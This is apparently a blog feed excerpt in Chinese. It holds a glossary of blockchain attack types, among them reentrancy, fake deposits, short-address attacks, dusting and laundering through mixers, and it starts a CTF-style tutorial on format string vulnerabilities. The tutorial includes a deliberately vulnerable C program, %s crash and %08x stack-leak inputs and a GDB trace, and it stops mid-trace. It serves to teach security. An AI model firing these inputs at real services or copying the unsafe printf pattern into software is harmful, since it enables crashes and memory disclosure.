class="headerlink" title="重入攻击 Reentrancy Attack"></a>重入攻击 Reentrancy Attack</h2><p>重入攻击(Reentrancy Attack)首次出现于以太坊，对应的真实攻击为 The DAO 攻击，此次攻击还导致了原来的以太坊分叉成以太经典(ETC)和现在的以太坊(ETH)。由于项目方采用的转账模型为先给用户发送转账然后才对用户的余额状态进行修改，导致恶意用户可以构造恶意合约，在接受转账的同时再次调用项目方的转账函数。利用这样的方法，导致用户的余额状态一直没有被改变，却能一直提取项目方资金，最终导致项目方资金被耗光。</p><h2 id="假充值攻击-False-Top-up"><a href="#假充值攻击-False-Top-up" class="headerlink" title="假充值攻击 False Top-up"></a>假充值攻击 False Top-up</h2><p>假充值攻击(False Top-up)，分为针对智能合约的假充值攻击和对交易所的假充值攻击。在假充值攻击中，无论是智能合约还是交易所本身，都没有收到真实的 Token，但是用户又确实得到了真实的充值记录，在这种情况下，用户就可以在没有真正充值的情况下从智能合约或交易所中用假资产或不存在的资产窃取真实资产。</p><h3 id="1-智能合约假充值攻击"><a href="#1-智能合约假充值攻击" class="headerlink" title="1.智能合约假充值攻击"></a>1.智能合约假充值攻击</h3><p>针对智能合约的假充值主要是假币的假充值，这种攻击手法多发于 EOS 和波场上，由于 EOS 上代币都是采用合约的方式进行发行的，EOS 链的系统代币同样也是使用这种方式发行，同时，任何人也可以发行名为 EOS 的代币。只是发行的合约帐号不一样，系统代币的发行合约为 “eosio.token”，而其他人发行的代币来源于其他合约帐号。当合约内没有校验 EOS 代币的来源合约的时候，攻击者就能通过充值攻击者自己发布的 EOS 代币，对合约进行假充值攻击。而波场上的假充值攻击主要是 TRC10 代币的假充值攻击，由于每一个 TRC10 都有一个特定的 tokenid 进行识别，当合约内没有对 tokenid 进行校验的时候，任何人都可以以 1024 个 TRX 发行一个 TRC10 代币对合约进行假充值。</p><h3 id="2-交易所假充值攻击"><a href="#2-交易所假充值攻击" class="headerlink" title="2.交易所假充值攻击"></a>2.交易所假充值攻击</h3><p>针对交易所的假充值攻击分为假币攻击和交易状态失败的假充值攻击。以 EOS 和以太坊为例。针对 EOS 可以使用名为 EOS 的假币的方式对交易所进行假充值攻击，如果交易所没有严格校验 EOS 的来源合约为 “eosio.token”，攻击就会发生。同时，区别于 EOS，由于以太坊上会保留交易失败的记录，针对 ERC20 Token，如果交易所没有校验交易的状态，就能通过失败的交易对交易所进行 ERC20 假充值。除此之外，hard_fail 状态攻击也是属于假充值攻击的一种。</p><h1 id="Part8"><a href="#Part8" class="headerlink" title="Part8"></a>Part8</h1><h2 id="短地址攻击-Short-Address-Attack"><a href="#短地址攻击-Short-Address-Attack" class="headerlink" title="短地址攻击 Short Address Attack"></a>短地址攻击 Short Address Attack</h2><p>短地址攻击(Short Address Attack)是针对以太坊上 ERC20 智能合约的一种攻击形式，利用的是 EVM 中的对于输入字节码的自动补全机制进行攻击。</p><p>一般而言，针对 ERC20 合约中的 transfer 函数的调用，输入的字节码位数都是 136 字节的。当调用 ERC20 中的 transfer 函数进行 ERC20 Token 转账时，如果攻击者提供的地址后有一个或多个 0，那么攻击者就可以把地址后的零省去，提供一个缺位的地址。当对这个地址转账的时候，比方说转账 100 的 A Token，然后输入的地址是攻击者提供的缺位地址，这时候，经过编码输入的数据是 134 字节，比正常的数据少了 2 字节，在这种情况下，EVM 就会对缺失的字节位在编码数据的末尾进行补 0 凑成 136 字节，这样本来地址段缺失的 0 被数据段的 0 补齐了，而由于给地址段补 0，数据段会少 0，而数据段缺失的 0 由 EVM 自动补齐，这就像数据段向地址段移动补齐地址段缺失字节位，然后数据段缺失的字节位由 EVM 用 0 补齐。这种情况下，转账金额就会由 100 变成 100 * 16 的 n 次方，n 是地址缺失的 0 的个数。通过这种方式，攻击者就能对交易所或钱包进行攻击，盗窃交易所和钱包的资产。</p><h2 id="假币攻击-Fake-Token-Attack"><a href="#假币攻击-Fake-Token-Attack" class="headerlink" title="假币攻击 Fake Token Attack"></a>假币攻击 Fake Token Attack</h2><p>假币攻击(Fake Token Attack)，是针对那些在创建官方 Token 时采用通用创建模版创建出来的代币，每个 Token 的识别仅根据特定的标记进行识别，如 EOS 官方 Token 的识别标记是 “eosio.token”合约，波场的 TRC10 的识别标记是 tokenid，以太坊的 ERC20 是用合约地址作为识别标记。那么这样就会出现一个问题，如果收款方在对这些 Token 进行收款的时候没有严格校验这些 Token 特有的标记，攻击就会发生，以 EOS 为例子，由于 EOS 官方 Token 采用的是合约来发行一个名为 EOS 的 Token，标记 EOS 本身的标识是 “eosio.token” 这个发行帐号，如果在接受转账的时候没有校验这个标识，攻击者就能用其他的帐号同样发行一个名为 EOS 的 Token，对交易所或钱包进行假币充值，换取真的代币。</p><p>2019 年 4 月 11 日，波场 Dapp TronBank 1 小时内被盗走约 1.7 亿枚 BTT（价值约 85 万元）。监测显示，黑客创建了名为 BTTx 的假币向合约发起“ invest ”函数，而合约并没有判定发送者的代币 id 是否与 BTT 真币的 id 1002000 一致。因此黑客拿到真币 BTT 的投资回报和推荐奖励，以此方式迅速掏空资金池。对此，交易所和钱包在处理转账的时候，切记要严格检验各种代币各种标识，防止假币攻击。</p><h2 id="整型溢出攻击-Integer-Overflow-Attack"><a href="#整型溢出攻击-Integer-Overflow-Attack" class="headerlink" title="整型溢出攻击 Integer Overflow Attack"></a>整型溢出攻击 Integer Overflow Attack</h2><p>数据的存储是区块链上重要的一环。但是每个数据类型本身是存在边界的，例如以太坊中 uint8 类型的变量就只能存储 0～255 大小的数据，超过了就存不下了。那么如果要放一个超过数据类型大小的数字会怎样呢？例如把 256 存进 uint8 的数据类型中，数据显示出来会变成 1，而不是其他数值，也不会报错，因为 uint8 本身能存一个 8 位二进制数字，最大值为 11111111，如果这个时候加 1，这个二进制数就变成了 100000001，而因为数据边界的关系，只能拿到后 8 位，也就是 00000001，那么数字的大小就变成 1 了，这种情况我们称为上溢。有上就有下，下溢的意思就是一个值为 0 的 uint8 数据，如果这个时候对它进行减 1 操作，结果会变成该数据类型所能存储的最大值加 1 减去被减数，在这个例子中是 255，也就是该数据类型所能存储的最大值。那么如果上述两种情况发生在智能合约当中的话，恶意用户通过下溢的操作，操纵自己的帐号向其他帐号发送超过自己余额数量的代币，如果合约内没有对余额进行检查，恶意用户的余额就会下溢出变成一个超大的值，这个时候攻击者如果大量抛售这些代币，就能瞬间破坏整个代币的价值系统。</p><h2 id="条件竞争攻击-Race-Condition"><a href="#条件竞争攻击-Race-Condition" class="headerlink" title="条件竞争攻击 Race Condition"></a>条件竞争攻击 Race Condition</h2><p>条件竞争(Race Condition)攻击的方式很多样，但是核心的本质无非是对某个条件的状态修改的竞争，如上面介绍的重入漏洞，也是条件竞争的一种，针对的是用户余额这个条件进行竞争，只要用户的余额没有归零，用户就能一直提走智能合约的钱。这次介绍的条件竞争的例子是最近发生的著名的 Edgeware 锁仓合约的拒绝服务漏洞，详情可参考：<a href="http://mp.weixin.qq.com/s?__biz=MzU4ODQ3NTM2OA==&amp;mid=2247484631&amp;idx=2&amp;sn=42b1cc849ed6a25d35bb24ed669af642&amp;chksm=fddd7a50caaaf346422e923e1709ff1bf051073ba86f51b4338d6526f8da3f693330a03461b5&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">关于 Edgeware 锁仓合约的拒绝服务漏洞</a>。这个漏洞问题的本质在于对新建的锁仓合约的余额的这个条件进行竞争。攻击者可以监控所有链上的锁仓请求，提前计算出锁仓合约的地址，然后向合约地址转账，造成锁仓失败。在官方没有修复之前，要防止这种攻击，只能使用比攻击者更高的手续费让自己的锁仓交易先行打包，从而与攻击者形成竞争避免攻击。最后，官方修复方案为不对锁仓合约的余额进行强制性的相等检查，而是采用大于等于的形式，避免了攻击的发生。</p><hr><h1 id="Part9"><a href="#Part9" class="headerlink" title="Part9"></a>Part9</h1><h2 id="越权访问攻击-Exceed-Authority-Access-Attack"><a href="#越权访问攻击-Exceed-Authority-Access-Attack" class="headerlink" title="越权访问攻击 Exceed Authority Access Attack"></a>越权访问攻击 Exceed Authority Access Attack</h2><p>在区块链的世界当中，一笔交易内可能含有多个不同的交易，而这些交易执行的顺序会影响最终的交易的执行结果，由于在挖矿机制的区块链中，交易未被打包前都处于一种待打包的 pending 状态，如果能事先知道交易里面执行了哪些其他交易，恶意用户就能通过增加矿工费的形式，发起一笔交易，让交易中的其中一笔交易先行打包，扰乱交易顺序，造成非预期内的执行结果，达成攻击。以以太坊为例，假如存在一个 Token 交易平台，这个平台上的手续费是通过调控合约中的参数实现的，假如某天平台项目方通过一笔交易请求调高交易手续费用，这笔交易被打包后的所有买卖 Token 的交易手续费都要提升，正确的逻辑应该是从这笔交易开始往后所有的 Token 买卖交易的手续费都要提升，但是由于交易从发出到被打包存在一定的延时，请求修改交易手续费的交易不是立即生效的，那么这时恶意用户就可以以更高的手续费让自己的交易先行打包，避免支付更高的手续费。</p><h2 id="女巫攻击-Sybil-Attack"><a href="#女巫攻击-Sybil-Attack" class="headerlink" title="女巫攻击 Sybil Attack"></a>女巫攻击 Sybil Attack</h2><p>传闻中女巫是一个会魔法的人，一个人可以幻化出多个自己，令受害人以为有多人，但其实只有一个人。在区块链世界中，女巫攻击(Sybil Attack)是针对服务器节点的攻击。攻击发生时候，通过某种方式，某个恶意节点可以伪装成多个节点，对被攻击节点发出链接请求，达到节点的最大链接请求，导致节点没办法接受其他节点的请求，造成节点拒绝服务攻击。以 EOS 为例，慢雾安全团队曾披露过的 EOS P2P 节点拒绝服务攻击实际上就是女巫攻击的一种，攻击者可以非常小的攻击成本来达到瘫痪主节点的目的。</p><p><a href="https://github.com/slowmist/papers/blob/master/EOSIO-P2P-Sybil-Attack/zh.md">攻击原理</a></p><h2 id="假错误通知攻击-Fake-Onerror-Notification-Attack"><a href="#假错误通知攻击-Fake-Onerror-Notification-Attack" class="headerlink" title="假错误通知攻击 Fake Onerror Notification Attack"></a>假错误通知攻击 Fake Onerror Notification Attack</h2><p>EOS 上存在各种各样的通知，只要在 action 中添加 require_recipient 命令，就能对指定的帐号通知该 action，在 EOS 上某些智能合约中，为了用户体验或其他原因，一般会对 onerror 通知进行某些处理。如果这个时候没有对 onerror 通知的来源合约是否是 eosio 进行检验的话，就能使用和假转账通知同样的手法对合约进行攻击，触发合约中对 onerror 的处理，从而导致被攻击合约资产遭受损失。</p><hr><h1 id="Part10"><a href="#Part10" class="headerlink" title="Part10"></a>Part10</h1><h2 id="粉尘攻击-Dusting-Attack"><a href="#粉尘攻击-Dusting-Attack" class="headerlink" title="粉尘攻击 Dusting Attack"></a>粉尘攻击 Dusting Attack</h2><p>粉尘攻击(Dusting Attack)最早发生于比特币网络当中，所谓粉尘，指的是交易中的交易金额相对于正常交易而言十分地小，可以视作微不足道的粉尘。通常这些粉尘在余额中不会被注意到，许多持币者也很容易忽略这些余额。但是由于比特币或基于比特币模型的区块链系统的账本模型是采用 UTXO 模型作为账户资金系统，即用户的每一笔交易金额，都是通过消费之前未消费的资金来产生新的资金。别有用意的用户，就能通过这种机制，给大量的账户发送这些粉尘金额，令交易粉尘化，然后再通过追踪这些粉尘交易，关联出该地址的其他关联地址，通过对这些关联地址进行行为分析，就可以分析一个地址背后的公司或个人，破坏比特币本身的匿名性。除此之外，由于比特币网络区块容量大小的限制，大量的粉尘交易会造成区块的拥堵，从而使得交易手续费提升，进而产生大量待打包交易，降低系统本身的运行效率。</p><p>对于如何避免粉尘攻击，可以在构造交易的过程中，根据交易的类型，计算出交易的最低金额，同时对每个输出进行判断，如果低于该金额，则不能继续构造该笔交易。特别的，如果这个输出刚好发生在找零上，且金额对于你来说不太大，则可以通过舍弃该部分的粉尘输出，以充作交易手续费来避免构造出粉尘交易。</p><h2 id="C2攻击-C2-Attack"><a href="#C2攻击-C2-Attack" class="headerlink" title="C2攻击 C2 Attack"></a>C2攻击 C2 Attack</h2><p>C2 全称 Command and Control，翻译过来就是命令执行与控制，在传统的网络攻击中，在通过各种漏洞进入到目标服务器后，受限于空间，通常通过网络拉取二段 exploit 进行驻留，实现后渗透流程。所以，C2 架构也就可以理解为，恶意软件通过什么样的方式获取资源和命令，以及通过什么样的方式将数据回传给攻击者。在传统的攻击手法中，攻击者一般通过远程服务器拉取命令到本地执行，但是这种方式也有很明显的缺点，就是一旦远程服务器被发现，后续渗透活动就无法正常进行。但是区块链网络提供了一个天然且不可篡改的大型数据库，攻击者通过把攻击荷载(payload)写进交易中，并通过发送交易把该命令永久的刻在区块链数据库中。通过这种方法，即使攻击命令被发现，也无法篡改链上数据，无需担心服务器被发现然后下线的风险。</p><p>新技术不断发展，旧有的攻击手法也在随着新技术的变换而不断迭代更新。在区块链的世界中只有在各方面都做好防范，才能避免来自各方面的安全攻击。</p><h2 id="洗币-Money-Laundering"><a href="#洗币-Money-Laundering" class="headerlink" title="洗币 Money Laundering"></a>洗币 Money Laundering</h2><p>洗币和洗钱是一样的，只是对象不同，洗钱指的是将一笔非法得到的金钱通过某些操作后变成正当、合法的收入。而洗币也是一样，指的是将非法获取的代币，如通过黑客攻击、携带用户资产跑路或通过诈骗等手段获取的代币，通过某些手段，将其来源变成正当、合法的来源。如通过交易所进行洗币、智能合约中洗币或通过某些搅拌器进行中转、通过匿名币种如门罗币，Zcash 等，令非法所得的资金无法被追踪，最后成功逃过监管达到洗币的目的，然后通过把代币转换成法币离场，完成洗币的流程。</p><h2 id="勒索-Ransom"><a href="#勒索-Ransom" class="headerlink" title="勒索 Ransom"></a>勒索 Ransom</h2><p>勒索是传统行业中常见的攻击行为，攻击者通过向受害者主机发送勒索病毒对主机文件进行加密来向受害者进行资金勒索。随着区块链技术的发展，近年来，勒索开始呈现新的方式，如使用比特币作为勒索的资金支付手段或使用匿名性更高的门罗币作为资金支付手段。如著名的 GandCrab 病毒就是比特币勒索病毒，受害者需要向攻击者支付一定量的比特币换取解密私钥。通过这种勒索手段，GandCrab 勒索病毒一年就勒索了超过 20 亿美金。值得一提的是，就算向攻击者发送比特币，也不一定能换取解密私钥，造成“人财两空”的局面。除此之外，慢雾安全团队还捕获到某些攻击者通过发送勒索邮件，谎称检测到交易所的漏洞，需要支付一定金额的比特币才能提供解决方案。这种勒索方式也是区块链行业近来越来越流行的勒索手段。</p><p>以上来源:<a href="https://paper.seebug.org/973/" target="_blank" rel="noopener">https://paper.seebug.org/973/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Block Chain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Block Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一步一步学pwn|格式化字符串(1)</title>
      <link href="/2020/05/19/gen-zhao-ctf-wiki-xue-pwn-ge-shi-hua-zi-fu-chuan-1/"/>
      <url>/2020/05/19/gen-zhao-ctf-wiki-xue-pwn-ge-shi-hua-zi-fu-chuan-1/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞原理介绍"><a href="#格式化字符串漏洞原理介绍" class="headerlink" title="格式化字符串漏洞原理介绍"></a>格式化字符串漏洞原理介绍</h1><p>首先，对格式化字符串漏洞的原理进行简单介绍。</p><h2 id="格式化字符串函数介绍"><a href="#格式化字符串函数介绍" class="headerlink" title="格式化字符串函数介绍"></a>格式化字符串函数介绍</h2><p>格式化字符串函数可以接受可变数量的参数，<strong>并将第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分：</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数(可选)</li></ul><p>以printf函数举例：</p><p><img src="https://img-blog.csdnimg.cn/20200519002938310.jpg" alt="在这里插入图片描述"></p><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>常见的格式化字符串函数有：</p><ul><li><p>输入</p><ul><li>scanf</li></ul></li><li><p>输出</p><table><thead><tr><th align="center">函数</th><th align="center">基本介绍</th></tr></thead><tbody><tr><td align="center">printf</td><td align="center">输出到stdout</td></tr><tr><td align="center">fprintf</td><td align="center">输出到指定FILE流</td></tr><tr><td align="center">vpirntf</td><td align="center">根据参数列表格式化输出到stdout</td></tr><tr><td align="center">vfprintf</td><td align="center">根据参数列表格式化输出到指定FILE流</td></tr><tr><td align="center">sprintf</td><td align="center">输出到字符串</td></tr><tr><td align="center">snprintf</td><td align="center">输出指定字节数到字符串</td></tr><tr><td align="center">vsprintf</td><td align="center">根据参数列表格式化输出到字符串</td></tr><tr><td align="center">vsnprintf</td><td align="center">根据参数列表格式化输出指定字节到字符串</td></tr><tr><td align="center">setproctitle</td><td align="center">设置argv</td></tr><tr><td align="center">syslog</td><td align="center">输出日志</td></tr><tr><td align="center">err,verr,warn,vwarn等</td><td align="center">…</td></tr></tbody></table></li></ul><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>格式化字符串的基本格式如下：</p><pre><code>%[parameter][flags][field width][.precision][length]type</code></pre><p><a href="[https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2](https://zh.wikipedia.org/wiki/格式化字符串)">format string-Wikipedia</a></p><ul><li><p>parameter(可选)</p><ul><li>n$,获取格式化字符串中的第n个参数</li></ul></li><li><p>flags(可为0个或多个)</p><table><thead><tr><th align="center">字符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">总是表示有符号数值的’+’或’-‘号，缺省情况是忽略正数的符号。仅适用于数值类型。</td></tr><tr><td align="center">空格</td><td align="center">使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td></tr><tr><td align="center">-</td><td align="center">左对齐。缺省情况是右对齐。</td></tr><tr><td align="center">#</td><td align="center">对于’g’与’G’,不删除尾部0以表示精度。对于’f’,’F’,’e’,’E’,’g’,’G’,总是输出小数点。对于’o’,’x’,’X’,在非0数值前分别输出前缀0,0x,and 0X表示数制。</td></tr><tr><td align="center">0</td><td align="center">如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如<code>printf("%2d", 3)</code>输出”<code>3</code>“，而<code>printf("%02d", 3)</code>输出”<code>03</code>“。如果<code>0</code>与<code>-</code>均出现，则<code>0</code>被忽略，即左对齐依然用空格填充。</td></tr></tbody></table></li><li><p>field width</p><ul><li>输出的最小宽度</li></ul></li><li><p>precision</p><ul><li>输出的最大长度</li></ul></li><li><p>length,输出的长度</p><ul><li>hh,输出一个字节</li><li>h，输出一个双字节</li></ul></li><li><p>type</p><ul><li>d/i,有符号整数</li><li>u,无符号整数</li><li>x/X,16进制unsigned int。x使用小写字母;X使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1.精度为0且值为0，则输出为空。</li><li>o，8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0.默认精度为1.精度为0且值为0，则输出为空。</li><li>s，如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。</li><li>c，如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</li><li>p,void *型，输出对应变量的值。printf(“%p”,a)用地址的格式打印变量a的值，printf(“%p”,&amp;a)打印变量a所在的地址。</li><li>n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%，’%’字面值，不接受任何flags,width。</li></ul></li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>即相应的要输出的变量。</p><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>上面说到，格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。</strong>比如说’%s’表明我们会输出一个字符串参数。</p><p>我们继续以上面的为例子进行介绍</p><p><img src="https://img-blog.csdnimg.cn/2020051900301089.jpg" alt="在这里插入图片描述"></p><p>对于这样的例子，在进入printf函数之前(即还没有调用printf函数)，栈上的布局由高地址到低地址依次为：</p><pre><code>some value    #假设为某个未知的值3.14123456addr of "red"addr of format string: Color %s...</code></pre><p>在进入printf之后，函数首先获取第一个参数，一个一个读取其字符串会遇到两种情况：</p><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是%，继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是%，输出%</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>假设在编写程序的时候，写成了下面的样子</p><pre><code>printf("Color %s,Number %d,Float %4.2f");</code></pre><blockquote><p>即没有提供参数，程序应该如何运行？</p></blockquote><p>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ul><li>1.解析其地址对应的字符串</li><li>2.解析其内容对应的整型值</li><li>3.解析其内容对应的浮点值</li></ul><p>对于2,3来说倒还无妨，但是对于1来说，如果提供了一个不可访问地址，比如0，那么程序就会因此而崩溃。</p><p>这基本就是格式化字符串漏洞的基本原理了。</p><hr><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><p>其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段</p><ul><li>使程序崩溃，因为%s对应的参数地址不合法的概率比较大。</li><li>查看进程内容，根据%d，%f输出了栈上的内容。</li></ul><p>下面我们会对于每一方面进行更加详细的解释。</p><h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们值需要输入若干个%s即可</p><pre><code>%s%s%s%s%s%s%s%s%s%s%s%s%s%s</code></pre><p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p><h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串的漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作：</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用GOT表得到libc函数地址，进而获取libc，进而获取其它libc函数地址</li><li>盲打，dump整个程序，获取有用信息</li></ul></li></ul><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>例如，给定如下程序</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编译，</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c In file included from /usr/include/stdio.h:27:0,                 from leakmemory.c:1:/usr/include/features.h:367:25: fatal error: sys/cdefs.h: No such file or directorycompilation terminated.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是什么奇怪的报错啊…</p><pre class="line-numbers language-c"><code class="language-c">devil@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span>$ gcc <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>no<span class="token operator">-</span>pie <span class="token operator">-</span>o leakmemory leakmemory<span class="token punctuation">.</span>cleakmemory<span class="token punctuation">.</span>c<span class="token punctuation">:</span> In function ‘main’<span class="token punctuation">:</span>leakmemory<span class="token punctuation">.</span>c<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span> warning<span class="token punctuation">:</span> format not a string literal and no format arguments <span class="token punctuation">[</span><span class="token operator">-</span>Wformat<span class="token operator">-</span>security<span class="token punctuation">]</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>把-m32去掉就好了。</p><p>可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数问题。下面我们来看一下如何获取对应的栈内存。</p><p>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下…</p><p>结果是运行没反应，考虑到可能是-m32参数没加的原因，上网查了之前的报错，可能是libc的库有问题。</p><pre class="line-numbers language-shell"><code class="language-shell">sudo apt-get purge libc6-devsudo apt-get install libc6-devsudo apt-get install libc6-dev-i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020051900303830.jpg" alt="在这里插入图片描述"></p><p>运行还是没反应…我突然发现原来程序要先输入…WSSB</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory %08x.%08x.%08x00000001.22222222.ffffffff.%08x.%08x.%08xffab5f48.f7f07918.00f0b5ff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p><p>首先，启动程序，将断点下载 printf 函数处</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemory gef➤  b printfBreakpoint 1 at 0x8048370<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">gef➤  rStarting program: /home/devil/leakmemory %08x.%08x.%08x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>敲击回车，程序继续运行，可以看出程序首先断在了第一次调用printf函数的位置</p><pre class="line-numbers language-assembly"><code class="language-assembly">Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  "%08x.%08x.%08x"$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7fb787c  →  0x00000000$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xffffcfd4│+0x0008: 0x000000010xffffcfd8│+0x000c: 0x222222220xffffcfdc│+0x0010: 0xffffffff0xffffcfe0│+0x0014: 0xffffd008  →  "%08x.%08x.%08x"0xffffcfe4│+0x0018: 0xffffd008  →  "%08x.%08x.%08x"0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     